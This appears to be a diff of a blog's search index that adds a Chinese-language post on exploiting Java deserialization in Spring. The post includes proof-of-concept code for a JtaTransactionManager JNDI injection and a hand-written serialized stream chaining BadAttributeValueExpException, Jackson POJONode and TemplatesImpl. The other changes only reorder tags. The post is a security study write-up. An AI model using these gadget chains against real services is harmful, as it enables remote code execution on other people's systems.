@@ -4,6 +4,29 @@
   
   
   <entry>
+    <title>Spring反序列化漏洞</title>
+    <link href="/2023/07/22/Spring%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2023/07/22/Spring%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学习。</p><a id="more"></a><hr><h3 id="通过Spring-tx依赖"><a href="#通过Spring-tx依赖" class="headerlink" title="通过Spring-tx依赖"></a>通过Spring-tx依赖</h3><p>光有Spring Web还不够，还需要一个Spring-tx依赖，根据本地的Spring版本选择了一个相同版本的Spring-tx依赖：</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;org.springframework&lt;/groupId&gt;    &lt;artifactId&gt;spring-tx&lt;/artifactId&gt;    &lt;version&gt;5.3.27&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>以前学习过，该依赖下存在JtaTransactionManager类，可以直接用于JNDI注入：</p><pre><code class="java">JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();jtaTransactionManager.setUserTransactionName(&quot;rmi://127.0.0.1:1099/Exploit&quot;);Util.unserialize(Util.serialize(jtaTransactionManager));</code></pre><p>测试时发现似乎由于属性userTransaction是一个未添加依赖的类型UserTransaction，虽然是transient修饰符的但还是导致了序列化失败，或许需要手写序列化流、自己整一个新的JtaTransactionManager类或者引入依赖再弄吧。</p><p>由于Spring中存在Tomcat依赖，因此可以使用里面的BeanFactory有限制地进行函数调用。</p><h3 id="通过Jackson"><a href="#通过Jackson" class="headerlink" title="通过Jackson"></a>通过Jackson</h3><p>以前学习过Java原生反序列化在反序列化时，FastJson的JSONObject类的toString函数会通过FastJson的方式序列化自身内部元素，进而触发它们的getter函数完成利用的方式，而Spring中虽然没有FastJson，却有跟FastJson有异曲同工之妙的Jackson。</p><p>类似FastJson的JSONObject类，Jackson中也有一个继承Serializable接口，还存在序列化自身元素的类POJONode，该类的serialize函数如下：</p><pre><code class="java">@Overridepublic final void serialize(JsonGenerator gen, SerializerProvider ctxt) throws IOException{    if (_value == null) {        ctxt.defaultSerializeNull(gen);    } else if (_value instanceof JsonSerializable) {        ((JsonSerializable) _value).serialize(gen, ctxt);    } else {        // 25-May-2018, tatu: [databind#1991] do not call via generator but through context;        //    this to preserve contextual information        ctxt.defaultSerializeValue(_value, gen);    }}</code></pre><p>按照常规定义，POJO类即简单的数据类，保存数据而不包含业务逻辑，各个成员一般都存在getter和setter函数，因此按一般理性而言，序列化时和FastJson一样会触发类的getter函数，并且可能都可以通过toString函数触发。</p><p>简单测试一下，但是其父类BaseJsonNode存在writeReplace函数：</p><pre><code class="java">Object writeReplace() {    return NodeSerialization.from(this);}</code></pre><p>因此按照正常流程序列化POJONode类时，序列化流程就会被该函数强制修改为Jackson自身定义的序列化方式：</p><pre><code>�� sr 5com.fasterxml.jackson.databind.node.NodeSerialization         xpw   {&quot;data&quot;:&quot;data&quot;}x</code></pre><p>很明显，Jackson通过这个NodeSerialization类来代理完成类的反序列化，因此想要正常生成测试用的序列化对象，就需要修改这个writeReplace函数。</p><p>方法有很多，不怕麻烦可以直接一点强行手写序列化字节流，优雅一点可以通过agent修改BaseJsonNode类的字节码把writeReplace函数删掉，折中一点的办法可以打开新的项目，自己写好POJONode类和其父类ValueNode来进行序列化。</p><p>这里通过直接手写序列化流的方式完成漏洞利用，可以参考Java8u20反序列化漏洞的做法，可以手写序列化流，因为实际上需要的数据只有一个BadAttributeValueExpException对象，一个POJONode对象和一个TemplatesImpl对象，因此构造起来也比较简单：</p><pre><code class="java">@RequestMapping(&quot;/deserialization&quot;)public String deserialization() {    if (this.bytes == null) {        this.bytes = Converter.toBytes(getPOC());    }    System.out.println(new String(this.bytes));    Object obj = Util.unserialize(this.bytes);    System.out.println(obj.getClass().getName());    return &quot;index&quot;;}private Object[] getPOC() {    return new Object[]{            STREAM_MAGIC, STREAM_VERSION, // 序列化数据头            TC_OBJECT,            TC_CLASSDESC,            BadAttributeValueExpException.class.getName(),            -3105272988410493376L,            (byte) 3, // flags (SC_SERIALIZABLE)            (short) 1, // field count            (byte) &#39;L&#39;, &quot;val&quot;, TC_STRING, &quot;Ljava/lang/Object;&quot;,            TC_ENDBLOCKDATA,            TC_NULL,            TC_OBJECT,            TC_CLASSDESC,            POJONode.class.getName(),            2L, // serialVersionUID            (byte) 3, // flags (SC_SERIALIZABLE)            (short) 1, // field count            (byte) &#39;L&#39;, &quot;_value&quot;, TC_STRING, &quot;Ljava/lang/Object;&quot;,            TC_ENDBLOCKDATA,            TC_NULL,            Util.getTemplatesPOC(),            TC_ENDBLOCKDATA,            TC_REFERENCE, baseWireHandle + 0x03,            TC_STRING, &quot;_value&quot;,            TC_ENDBLOCKDATA,            TC_REFERENCE, baseWireHandle + 0x01,            TC_STRING, &quot;val&quot;,    };}</code></pre><p>具体的对象引用通过调试可知，虽然序列化和反序列化正常进行了，但实际运行中却发现反序列化漏洞没有正常触发，根据调试，可知getter函数的触发位于BeanSeriallizerBase类的serializeFields函数中：</p><pre><code class="java">if (_filteredProps != null &amp;&amp; provider.getActiveView() != null) {    props = _filteredProps;} else {    props = _props;}int i = 0;try {    for (final int len = props.length; i &lt; len; ++i) {        BeanPropertyWriter prop = props[i];        if (prop != null) { // can have nulls in filtered list            prop.serializeAsField(bean, gen, provider);        }    }    if (_anyGetterWriter != null) {        _anyGetterWriter.getAndSerialize(bean, gen, provider);    }}</code></pre><p>发现此时首先调用了TemplatesImpl的getStylesheetDOM函数：</p><pre><code class="java">public DOM getStylesheetDOM() {    return (DOM)_sdom.get();}</code></pre><p>而由于_sdom成员是一个transient成员，因此调用时该成员就会为null，调用该函数就会抛出异常直接结束getter的遍历调用。</p><p>进行调试，发现getter是由ClassUtil类中的getClassMethods函数通过Class.getDeclaredMethods函数获取的，换而言之就是乱序，然后交给POJOPropertiesCollector类的collectAll函数移除一些不想要的成员或者getter，最后遍历访问。</p><p>因此每次运行程序时getter的调用顺序都不一样，多启动几次程序可以发现漏洞可以成功利用。</p><p>怪耶！</p><hr><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zeroer.xyz/articles/140" target="_blank" rel="noopener">Spring 反序列化JNDI注入漏洞</a></p><p><a href="https://github.com/StrawHatCTF/writeups/blob/main/aliyunCTF2023/AliyunCTF%20By%20Straw%20Hat.pdf" target="_blank" rel="noopener">AliyunCTF By Straw Hat</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+      <tag>Java</tag>
+      
+      <tag>反序列化</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>原型链污染注入HTML模板</title>
     <link href="/2023/07/04/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%B3%A8%E5%85%A5HTML%E6%A8%A1%E6%9D%BF/"/>
     <url>/2023/07/04/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%B3%A8%E5%85%A5HTML%E6%A8%A1%E6%9D%BF/</url>
@@ -2635,9 +2658,9 @@
       
       <tag>Web</tag>
       
-      <tag>复现</tag>
-      
       <tag>二进制</tag>
+      
+      <tag>复现</tag>
       
       <tag>PHPFPM</tag>
       
@@ -2786,9 +2809,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>Python</tag>
       
@@ -2895,9 +2918,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>PHP</tag>
       
@@ -2918,9 +2941,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>前端</tag>
       
@@ -2941,9 +2964,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>前端</tag>
       
@@ -3008,9 +3031,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>Web</tag>
+      
+      <tag>Crypto</tag>
       
       <tag>Pwn</tag>
       
@@ -3033,9 +3056,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>FastCGI</tag>
       
@@ -3056,9 +3079,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>Mongodb</tag>
       
@@ -3081,9 +3104,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>Python</tag>
       
@@ -3104,11 +3127,11 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
       
       <tag>Java</tag>
+      
+      <tag>CTF</tag>
       
       <tag>复现</tag>
       
@@ -3190,9 +3213,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -3257,9 +3280,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>复现</tag>
       
@@ -3284,9 +3307,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -3305,9 +3328,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>前端</tag>
       
@@ -3349,11 +3372,11 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
       
       <tag>Java</tag>
+      
+      <tag>CTF</tag>
       
       <tag>Spring</tag>
       
@@ -3441,9 +3464,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>Karaf</tag>
       
@@ -3602,9 +3625,9 @@
     
     <tags>
       
-      <tag>复现</tag>
-      
       <tag>二进制</tag>
+      
+      <tag>复现</tag>
       
       <tag>docker</tag>
       
@@ -3650,9 +3673,9 @@
     
     <tags>
       
-      <tag>复现</tag>
-      
       <tag>二进制</tag>
+      
+      <tag>复现</tag>
       
       <tag>Winrar</tag>
       
@@ -3673,9 +3696,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>前端</tag>
       
